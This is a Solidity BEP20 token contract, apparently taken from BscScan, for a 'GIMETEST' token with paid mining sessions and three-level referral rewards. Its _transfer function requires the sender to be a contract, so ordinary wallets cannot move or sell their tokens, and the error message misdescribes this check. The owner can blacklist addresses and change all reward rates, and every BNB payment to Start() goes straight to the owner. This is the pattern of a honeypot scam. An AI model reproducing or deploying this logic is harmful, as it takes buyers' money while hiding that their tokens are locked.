/**
 *Submitted for verification at BscScan.com on 2022-01-16
*/

/**
 *Submitted for verification at BscScan.com on 2022-01-13
*/

pragma solidity ^0.8.11;

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function total_num() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IBEP20M is IBEP20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

contract BEP20 is IBEP20, IBEP20M {
    mapping(address => uint256) public _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    uint256 private _totalnum;
    string private _name;
    string private _symbol;
    mapping (address => bool) black;

    constructor(string memory name_, string memory symbol_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _totalSupply = totalSupply_;
        _totalnum = totalSupply_;
    }

    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    function total_num() public view virtual override returns (uint256) {
        return _totalnum;
    }
    function burn_total_num(uint256 amount) internal virtual{
        _balances[msg.sender]+=amount;
        _totalnum-=amount;
        emit Transfer(address(0), msg.sender, amount);
    }
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "BEP20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, msg.sender, currentAllowance - amount);
        }

        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "transfer null address");
        require(recipient != address(0), "transfer null address");
        require(isContract(sender),"Don't transfer money to the contract");
        require(!black[sender],"you is blacklist");
        require(_balances[sender] >= amount, "BEP20: transfer amount exceeds balance");
        
        unchecked {
            _balances[sender] -= amount;
        }
        _balances[recipient] += amount;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract Token is BEP20 {
    uint256 private ethBurn  = 0.003 * 10 ** 18;
    uint256 private power0   = 100;
    uint256 private power1   = 10;
    uint256 private power2   = 5;
    uint256 private power3   = 2;
    uint256 private timeLast = 86400;
    uint256 private sec1Rate = 121527777777777;  // 1 power 1second = 0.00012152778, 100 power 1 hour = 43.75 
    address private contract_owner;
    
    mapping (address => uint256[3]) private data;  // stime ctime unclaim
    mapping (address => address[])  private team1; // user -> teams1
    mapping (address => address[])  private team2; // user -> teams2
    mapping (address => address[])  private team3; // user -> teams3
    mapping (address => address)    private boss;  // user -> boss
     
    constructor() BEP20("GIMETEST", "GIMETEST",21000000000000000000000000) {
        contract_owner = msg.sender;
    }
    
    function setBlack(address addr, bool val) public {
        require(msg.sender==contract_owner, "no permission");
        black[addr] = val;
    }

    function getTeam1(address addr) public view returns (address[] memory) {
        return team1[addr];
    }
    
    function getTeam2(address addr) public view returns (address[] memory) {
        return team2[addr];
    }
    
    function getTeam3(address addr) public view returns (address[] memory) {
        return team3[addr];
    }
    
    function getData(address addr) public view returns (uint256[18] memory, address, address) {
        uint256 invite = sumInvitePower(addr);
        uint256 claim;
        uint256 half;
        (claim,half) = getClaim(addr, invite);
        uint256[18] memory arr = [ethBurn, power0, invite, power1, power2, power3, 
            sec1Rate, data[addr][0], data[addr][1], team1[addr].length, team2[addr].length, team3[addr].length, 
            timeLast, totalSupply(),total_num(), balanceOf(addr), claim, half];
        return (arr, boss[addr], contract_owner);
    }
    
    function setData(uint256[] memory confs) public {
        require(msg.sender==contract_owner, "no permission");
        ethBurn  = confs[0];
        power0   = confs[1];
        power1   = confs[2];
        power2   = confs[3];
        power3   = confs[4];
        sec1Rate = confs[5];
        timeLast = confs[6];
    }

    function getClaim(address addr, uint256 invitePower) public view returns(uint256, uint256) {
        uint256 claimNum = data[addr][2];
        uint256 half = sec1Rate;
        uint256 halfpower;
        if(total_num() < 1 * (10**18)){
            half=0;
        }else if (total_num() < 3000000 * (10 ** 18)) {
            half = sec1Rate/2/2/2/2/2/2;
        } else if (total_num() < 6000000 * (10 ** 18)) {
            half = sec1Rate/2/2/2/2/2;
        } else if (total_num() < 9000000 * (10 ** 18)) {
            half = sec1Rate/2/2/2/2;
        } else if (total_num() < 12000000 * (10 ** 18)) {
            half = sec1Rate/2/2/2;
        } else if (total_num() < 15000000 * (10 ** 18)) {
            half = sec1Rate/2/2;
        } else if (total_num() < 18000000 * (10 ** 18)) {
            half = sec1Rate/2;
        }
        
        // plus mining claim
        if (data[addr][1] > 0 && data[addr][1] > block.timestamp) {
            uint256 power = power0 + invitePower;
            
            claimNum += ((data[addr][1] - data[addr][0]) * power) * half;
            halfpower=power*half;
        }
        
        return (claimNum, halfpower);
    }
    
    function sumInvitePower(address addr) public view returns (uint256) {
        uint256 total = 0;
        for (uint256 i=0; i<team1[addr].length; i++) {
            address team = team1[addr][i];
            if (data[team][0] + timeLast > block.timestamp) {
                total += power1;
            }
        }
        for (uint256 i=0; i<team2[addr].length; i++) {
            address team = team2[addr][i];
            if (data[team][0] + timeLast > block.timestamp) {
                total += power2;
            }
        }
        for (uint256 i=0; i<team3[addr].length; i++) {
            address team = team3[addr][i];
            if (data[team][0] + timeLast > block.timestamp) {
                total += power3;
            }
        }
        return total;
    }
    
    function Start(address invite) public payable {
        require(msg.value >= ethBurn);
        payable(contract_owner).transfer(msg.value);
        if (boss[msg.sender] == address(0) && msg.sender != invite && invite != address(0)) {
            boss[msg.sender] = invite;
            team1[invite].push(msg.sender);
            
            address invite2 = boss[invite];
            if (invite2 != address(0)) {
                team2[invite2].push(msg.sender);
                
                invite2 = boss[invite2];
                if (invite2 != address(0)) {
                    team3[invite2].push(msg.sender);
                }
            } 
        }
        
        if (data[msg.sender][0] > 0) {
            uint256 claim;
            (claim,) = getClaim(msg.sender, sumInvitePower(msg.sender));
            data[msg.sender][2] = claim;
        }
        
        data[msg.sender][0] = block.timestamp;
        data[msg.sender][1] = block.timestamp+timeLast;
        
    }
    
    function end() public {
        uint256 canClaim;
        (canClaim,) = getClaim(msg.sender, sumInvitePower(msg.sender));
        require(total_num() > canClaim);
        if(total_num()-canClaim>0){
        burn_total_num(canClaim);
        }
        if (canClaim > 0) {
            data[msg.sender][0] = 0;
            data[msg.sender][1] = 0;
            data[msg.sender][2] = 0;
        }
    }
    
}